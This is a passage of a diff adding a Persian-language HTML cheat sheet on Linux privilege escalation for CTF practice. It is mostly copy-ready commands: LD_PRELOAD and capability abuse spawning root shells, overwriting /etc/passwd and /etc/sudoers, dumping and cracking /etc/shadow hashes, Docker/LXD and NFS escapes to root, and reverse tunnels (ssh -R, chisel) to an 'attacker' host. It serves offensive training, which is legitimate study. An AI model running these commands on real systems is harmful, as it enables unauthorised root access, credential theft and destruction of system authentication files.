+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c
+sudo LD_PRELOAD=/tmp/evil.so find</code></pre>
+            </div>
+
+            <h3 class="sub-title">۵️⃣ Linux Capabilities</h3>
+            <h4 class="sub-title" style="font-size: 1.1rem; color: var(--warn-color);">پیدا کردن Capabilities:</h4>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">getcap -r / 2&gt;/dev/null
+getcap -r /usr/bin/ 2&gt;/dev/null
+find / -type f -exec getcap {} \; 2&gt;/dev/null</code></pre>
+            </div>
+            
+            <h4 class="sub-title" style="font-size: 1.1rem; color: var(--warn-color);">Capabilities خطرناک:</h4>
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Capability</th>
+                            <th>توضیحات</th>
+                            <th>روش بهره‌برداری</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><code>cap_setuid+ep</code></td><td>تغییر UID</td><td><code>python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></td></tr>
+                        <tr><td><code>cap_setgid+ep</code></td><td>تغییر GID</td><td><code>python3 -c 'import os; os.setgid(0); os.system("/bin/bash")'</code></td></tr>
+                        <tr><td><code>cap_sys_admin+ep</code></td><td>مانت کردن</td><td><code>mount -o remount,exec /tmp</code></td></tr>
+                        <tr><td><code>cap_dac_override+ep</code></td><td>دور زدن مجوزها</td><td>خواندن/نوشتن هر فایل</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <h3 class="sub-title">۶️⃣ World-Writable Files</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># پیدا کردن فایل‌های World-Writable
+find / -type f -perm -o+w 2&gt;/dev/null
+find / -type d -perm -o+w 2&gt;/dev/null
+
+# روش‌های بهره‌برداری:
+
+# اگر /etc/passwd قابل نوشتن باشد
+echo 'root::0:0:root:/root:/bin/bash' &gt; /etc/passwd
+su root  # بدون رمز
+
+# اگر /etc/sudoers قابل نوشتن باشد
+echo 'user ALL=(ALL:ALL) ALL' &gt;&gt; /etc/sudoers
+sudo su -</code></pre>
+            </div>
+
+            <h3 class="sub-title">۷️⃣ Readable /etc/shadow</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># اگر بتوانید /etc/shadow را بخوانید
+cat /etc/shadow 2&gt;/dev/null
+
+# کرک کردن هش‌ها
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
+
+# انواع هش‌ها در /etc/shadow
+# $1$  # MD5
+# $5$  # SHA-256
+# $6$  # SHA-512
+
+# ساختن هش جدید
+openssl passwd -1 -salt xyz newpassword  # MD5
+openssl passwd -6 -salt xyz newpassword  # SHA-512</code></pre>
+            </div>
+
+            <h3 class="sub-title">۸️⃣ Docker and Containers</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># اگر کاربر در گروه Docker باشد (خروج از container)
+docker run -v /:/mnt --rm -it ubuntu bash
+cd /mnt
+chroot .
+
+# یا با busybox
+docker run -it --rm -v /:/mnt busybox
+chroot /mnt /bin/bash
+
+# اگر کاربر در گروه LXD باشد
+lxc init alpine:edge root-container -c security.privileged=true
+lxc config device add root-container mydevice disk source=/ path=/mnt/root recursive=true
+lxc start root-container
+lxc exec root-container bash</code></pre>
+            </div>
+
+            <h3 class="sub-title">۹️⃣ NFS (Network File System)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># بررسی NFS shares
+cat /etc/exports
+showmount -e localhost
+
+# اگر NFS با no_root_squash باشد
+mkdir /tmp/nfs
+mount -t nfs localhost:/path /tmp/nfs
+cd /tmp/nfs
+
+# کپی کردن bash با SUID
+cp /bin/bash .
+chmod +s bash
+./bash -p</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 5 -->
+        <section id="phase5" class="tool-section">
+            <h2 class="tool-title">🔐 فاز ۵: تونل‌زنی و دسترسی به سرویس‌های داخلی</h2>
+            
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ۱. SSH Tunneling (پیشرفته)
+# Local Port Forwarding
+ssh -L 8080:localhost:80 user@target
+
+# Remote Port Forwarding
+ssh -R 8080:localhost:80 user@attacker
+
+# Dynamic Port Forwarding (SOCKS5)
+ssh -D 1080 user@target
+
+# ۲. Chisel (پیشرفته)
+# روی سرور (میزبان)
+chisel server -p 8000 --reverse
+
+# روی هدف
+chisel client attacker:8000 R:socks
+
+# ۳. Socat
+# روی هدف
+socat TCP-LISTEN:8080,fork TCP:localhost:80 &amp;
+
+# ۴. ProxyChains
+# در /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+
+# استفاده
+proxychains nmap -sT -p- 127.0.0.1</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 6 -->
+        <section id="phase6" class="tool-section">
+            <h2 class="tool-title">📊 فاز ۶: ابزارهای اتوماتیک (برای سرعت در CTF)</h2>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ابزار</th>
+                            <th>کاربرد</th>
+                            <th>دستورات مهم</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>LinPEAS</strong></td><td>Enumeration کامل</td><td><code>./linpeas.sh -a</code></td></tr>
+                        <tr><td><strong>PSPY</strong></td><td>مشاهده فرآیندها</td><td><code>./pspy64 -cf</code></td></tr>
+                        <tr><td><strong>Linux Exploit Suggester</strong></td><td>کرنل exploits</td><td><code>./linux-exploit-suggester.sh</code></td></tr>
+                        <tr><td><strong>SUID3NUM</strong></td><td>SUID/SGID</td><td><code>./suid3num.py</code></td></tr>
+                        <tr><td><strong>GTFOBins</strong></td><td>دستورات exploit</td><td>جستجوی آنلاین</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Checklist -->
+        <section id="checklist" class="tool-section">
+            <h2 class="tool-title">✅ چک‌لیست نهایی CTF (100% کامل)</h2>
+            
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 1: Enumeration پایه</h3>
+                <ul>
+                    <li><code>uname -a</code> (کرنل)</li>
+                    <li><code>whoami &amp;&amp; id</code> (کاربر فعلی)</li>
+                    <li><code>sudo -l</code> (دستورات سودو)</li>
+                    <li><code>cat /etc/passwd</code> (کاربران)</li>
+                    <li><code>cat /etc/shadow</code> (هش‌ها)</li>
+                    <li><code>history</code> (تاریخچه)</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 2: Network & Services</h3>
+                <ul>
+                    <li><code>netstat -tulpn</code> (پورت‌ها)</li>
+                    <li><code>ps aux</code> (فرآیندها)</li>
+                    <li><code>systemctl list-units</code> (سرویس‌ها)</li>
+                    <li><code>crontab -l</code> (کرون‌جاب‌ها)</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 3: SUID/SGID & Capabilities</h3>
+                <ul>
+                    <li><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>
+                    <li><code>find / -perm -g=s -type f 2&gt;/dev/null</code></li>
+                    <li>تست هر فایل با GTFOBins</li>
+                    <li><code>getcap -r / 2&gt;/dev/null</code></li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 4: Writable & Configs</h3>
+                <ul>
+                    <li><code>find / -type f -perm -o+w 2&gt;/dev/null</code></li>
+                    <li><code>find / -name "*.conf" -exec grep -l "pass\|key" {} \;</code></li>
+                    <li><code>ls -la ~/.ssh/</code></li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Tips -->
+        <section id="tips" class="tool-section">
+            <h2 class="tool-title">💡 نکات طلایی پیشرفته برای CTF</h2>
+            
+            <div class="tip-box">
+                <ol>
+                    <li><strong>ترکیب روش‌ها:</strong> هیچ‌وقت به یک روش اکتفا نکنید. ترکیب LFI + Log Poisoning + SUID</li>
+                    <li><strong>صبر و دقت:</strong> بعضی کرون‌جاب‌ها هر ۵-۱۰ دقیقه اجرا می‌شوند</li>
+                    <li><strong>فایل‌های موقت:</strong> <code>/tmp/</code>, <code>/var/tmp/</code>, <code>/dev/shm/</code> معمولاً قابل نوشتن هستند</li>
+                    <li><strong>متغیرهای محیطی:</strong> گاهی رمز عبور در <code>env</code> یا <code>set</code> است</li>
+                    <li><strong>تاریخچه:</strong> همیشه <code>history</code> و <code>~/.bash_history</code> را چک کنید</li>
+                    <li><strong>لاگ‌ها:</strong> ممکن است رمز عبور در لاگ‌ها نوشته شده باشد</li>
+                    <li><strong>پورت‌های داخلی:</strong> سرویس‌های روی localhost را تونل کنید</li>
+                    <li><strong>Git:</strong> اگر <code>.git/</code> وجود داشته باشد، ممکن است رمز عبور در تاریخچه باشد</li>
+                    <li><strong>Sudo -l:</strong> حتی اگر دستوری نداشته باشید، ممکن است <code>env_keep</code> شامل چیزهای مهم باشد</li>
+                    <li><strong>بحث و تبادل نظر:</strong> گاهی با کاربران دیگر سیستم صحبت کنید (CTF)</li>
+                </ol>
+            </div>
+        </section>
+
+        <!-- Recommended Machines -->
+        <section id="machines" class="tool-section">
+            <h2 class="tool-title">🏆 ماشین‌های پیشنهادی CTF (سخت‌تر به ترتیب)</h2>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>سطح</th>
+                            <th>ماشین</th>
+                            <th>تکنیک‌های اصلی</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>مبتدی</td><td>Lin.Security: 1</td><td>SUID, Cron</td></tr>
+                        <tr><td>مبتدی-متوسط</td><td>Escalate_Linux</td><td>کرنل, Sudo</td></tr>
+                        <tr><td>متوسط</td><td>Book-Shelf: 1</td><td>Sudo, Capabilities</td></tr>
+                        <tr><td>متوسط-پیشرفته</td><td>TryHackMe: Linux PrivEsc</td><td>تمام روش‌ها</td></tr>
+                        <tr><td>پیشرفته</td><td>HackTheBox: Sense</td><td>Cron, Sudo</td></tr>
+                        <tr><td>پیشرفته-حرفه‌ای</td><td>HackTheBox: Netmon</td><td>Docker, NFS</td></tr>
+                        <tr><td>حرفه‌ای</td><td>HackTheBox: SolidState</td><td>JMX, RMI</td></tr>
+                        <tr><td>افسانه‌ای</td><td>HackTheBox: Retired</td><td>ترکیب چندین روش</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="goal-box" style="text-align: center; margin-top: 20px;">
+                <strong>"در لینوکس، همیشه راهی برای بالا رفتن وجود دارد. فقط باید به‌درستی نگاه کنید."</strong><br>
+                این چیت‌شیت تمام تکنیک‌های ممکن برای ارتقای دسترسی در لینوکس را پوشش می‌دهد.<br>
+                <strong>موفق باشید و هک لذت‌بخشی داشته باشید! 🚀🐧🔥</strong>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        // Initialize Highlight.js
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+
+        // Copy to Clipboard Function (Safely decodes HTML entities back to original code for copying)
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-container').querySelector('code');
+            const textArea = document.createElement('textarea');
+            textArea.value = codeBlock.innerText; 
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+
+            btn.innerText = '✓ کپی شد';
+            btn.style.background = '#e3b341';
+            btn.style.color = '#000';
+            btn.style.borderColor = '#e3b341';
+            
+            setTimeout(() => {
+                btn.innerText = 'کپی';
+                btn.style.background = '';
+                btn.style.color = '';
+                btn.style.borderColor = '';
+            }, 2000);
+        }
+
+        // Live Search Filter
+        function filterTools() {
+            const input = document.getElementById('searchInput').value.toLowerCase();
+            const listItems = document.querySelectorAll('.nav-list li');
+            
+            listItems.forEach(item => {
+                const text = item.textContent.toLowerCase();
+                if (text.includes(input)) {
+                    item.style.display = '';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        }
+
+        // ScrollSpy Implementation
+        const sections = document.querySelectorAll('.tool-section');
+        const navLinks = document.querySelectorAll('.nav-list a');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (pageYOffset >= sectionTop - 50) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(a => {
+                a.classList.remove('active');
+                if (a.getAttribute('href') === '#' + current) {
+                    a.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
